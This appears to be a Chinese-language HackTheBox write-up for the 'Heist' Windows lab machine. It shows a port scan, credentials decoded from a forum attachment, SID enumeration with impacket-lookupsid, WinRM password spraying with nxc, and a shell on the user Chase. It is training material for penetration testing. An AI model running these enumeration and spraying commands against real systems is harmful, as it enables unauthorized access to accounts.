---
title: Heist
weight: 201
tags:
  - windows
  - easy
  - winrm
  - rid-cycling
---


### 1. 信息收集

> [!note]
> 机器ip：10.10.10.149
> 攻击机ip：10.10.14.6


```
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack
135/tcp   open  msrpc        syn-ack
445/tcp   open  microsoft-ds syn-ack
5985/tcp  open  wsman        syn-ack
49669/tcp open  msrpc        syn-ack
```


[[80,443 - Web]] 探索一番，发现有一个 `Hazard` 用户在向 Support 寻求帮助。从他发的附件文件里面，收集到以下账户密码：

[Cisco Type 7 Password Decrypt / Decoder / Crack Tool](https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html)

```
Hazard: stealth1agent
rout3r: $uperP@ssword
admin: Q4)sJu\Y8qz*A3?d
```


```bash
┌──(kali㉿kali)-[~/Documents/01-HackTheBox/01-Machines/Heist]
└─$ impacket-lookupsid 'Hazard':'stealth1agent'@'10.10.10.149'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)

```

```bash
┌──(kali㉿kali)-[~/Documents/01-HackTheBox/01-Machines/Heist]
└─$ nxc winrm 10.10.10.149 -u username.list -p password.list  
WINRM       10.10.10.149    5985   SUPPORTDESK      [+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d (Pwn3d!)
```


```bash
*Evil-WinRM* PS C:\Users\Chase\Desktop> type todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
```

